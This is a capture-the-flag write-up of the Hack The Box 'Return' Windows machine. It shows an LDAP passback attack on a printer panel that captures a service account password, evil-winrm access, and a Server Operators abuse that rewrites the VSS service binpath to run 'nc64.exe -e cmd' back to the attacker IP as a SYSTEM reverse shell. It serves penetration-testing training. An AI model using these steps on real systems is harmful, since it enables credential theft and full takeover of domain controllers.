---
layout: post
title:  HTB Return Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-10 00:00:00 +0300
image:  '/images/htb_return.png'
tags:   [Write-ups, HTB, OSCP+, Windows, Easy, Active-Directory, Passback-LDAP-Attack, LDAP, Printer, Server-Operators, sc.exe, Service-Restart]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
  - [Passback attack changing Server Address to our Kali and nc listener IP](#passback-attack-changing-server-address-to-our-kali-and-nc-listener-ip)
- [Foothold](#foothold)
  - [Access as svc-printer using evil-winrm](#access-as-svc-printer-using-evil-winrm)
- [Privilege Escalation](#privilege-escalation)
  - [Enumerating svc-printer privileges and group memberships](#enumerating-svc-printer-privileges-and-group-memberships)
  - [Using sc.exe to restart VSS service and get a reverse shell with nc64.exe](#using-scexe-to-restart-vss-service-and-get-a-reverse-shell-with-nc64exe)

# Enumeration
### Nmap
```shell
# Step 1 - Find active ports (This time its important to use -Pn and sudo, otherwise the scan wont succeed)
sudo nmap -p- -Pn --min-rate 10000 10.129.95.241

# Step 2 - Focus scan on the active ports found (Note: In this case is important to use -T4 to make the scan succeed)
sudo nmap -A -T4 -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 10.129.95.241
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-09 17:35 EST
Nmap scan report for 10.129.95.241
Host is up (0.038s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-09 22:54:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|2012|10|2022|2008|7 (95%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7::sp1
Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 1909 (91%), Microsoft Windows Server 2022 (90%), Microsoft Windows 10 1709 - 1909 (86%), Microsoft Windows Server 2012 (86%), Microsoft Windows Server 2012 or Server 2012 R2 (85%), Microsoft Windows 10 1703 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 7 SP1 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 18m35s
| smb2-time: 
|   date: 2024-11-09T22:54:38
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   37.76 ms 10.10.14.1
2   37.84 ms 10.129.95.241

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.46 seconds
```

Examining the results of our Nmap scan, we can find the typical ports of a domain controller.

### Web Enumeration
After trying some uncredentialed enumeration on SMB and RPC, we decided the best next step would be to enumerate the website:

```shell
http://10.129.95.241
```

It looks like the website of a printer.

If we click on Settings, we will be able to see the following:

```shell
http://10.129.95.241/settings.php
```

```shell
Server Address: printer.return.local
Server Port: 389
Username: svc-printer
Password: *******
```

We tried inspecting the Password input box, but we werent able to see the saved password.

We can add the domain to /etc/hosts:

```shell
echo "10.129.95.241 printer.return.local" | sudo tee -a /etc/hosts
```

### Passback attack changing Server Address to our Kali and nc listener IP
Let's try to connect the printer to a nc listener on our Kali to see if we can intercept anything.

First start the nc listener:

```shell
nc -lvnp 389
```

Then go to the website settings:

```shell
http://10.129.95.241/settings.php
```

Change the configuration there to the following:

```shell
Server Address: 10.10.14.206 # Enter our Kali tun0 IP here
Server Port: 389
Username: svc-printer
Password: ******* # Dont touch, dont change this!
```

After entering the configuration above, click on Update.

We will get a response on our nc listener after that:

```shell
listening on [any] 389 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.95.241] 51246
0*`%return\svc-printer�
                       1edFg43012!!
```

Nice! We got a password for svc-printer.

# Foothold
### Access as svc-printer using evil-winrm
We can now try the credentials we found to get access using evil-winrm:

```shell
evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'
```

It worked! We got access as svc-printer:

```shell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer
```

### User Flag
Now we can get the user.txt flag:

```shell
type C:\Users\svc-printer\Desktop\user.txt
```

# Privilege Escalation
### Enumerating svc-printer privileges and group memberships
We will start enumerating the privileges and group memberships of the svc-printer user:

```shell
whoami /all
```

```shell

USER INFORMATION
----------------

User Name          SID
================== =============================================
return\svc-printer S-1-5-21-3750359090-2939318659-876128439-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Examining the results, we can see that svc-printer is a member of the group Server Operators.

### Using sc.exe to restart VSS service and get a reverse shell with nc64.exe

Members of the Server Operators group can modify, start and stop services. We can abuse this to get a reverse shell using nc64.exe.

First upload nc64.exe:

```shell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> cd C:\Windows\Temp
*Evil-WinRM* PS C:\Windows\Temp> upload nc64.exe
```

We can try these commands to try to enumerate services:

```shell
# Using sc.exe on cmd
sc.exe query

# On PowerShell
$services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where {$_.access.IdentityReference -match 'Server Operators'}}
```

Unfortunately both failed, apparently svc-printer doesnt have Service Control Manager access.

Searching on Google, we found an example for the VSS service. We will run the commands as on the example, entering our Kali tun0 IP and port of our nc listener:

```shell
# Start nc listener on Kali
sudo nc -lvnp 443

# Enter the following command on target evil-winrm PowerShell CLI
sc.exe config VSS binpath="C:\Windows\Temp\nc64.exe -e cmd 10.10.14.206 443"
```

Nice! It was successful:

```shell
[SC] ChangeServiceConfig SUCCESS
```

Now restart the service using the following commands:

```shell
# Stop VSS
sc.exe stop VSS

# Start VSS again
sc.exe start VSS
```

It works! We got a reply on our nc listener, giving us a shell as NT AUTHORITY\SYSTEM:

```shell
listening on [any] 443 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.95.241] 55969
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Note: If the shell we got through nc listener stops responding and we cant run any commands, repeat the process again and dont wait too long to enter a command on our nc listener shell.
### Root Flag
Now we can get the root.txt flag:

```shell
type C:\Users\Administrator\Desktop\root.txt
```
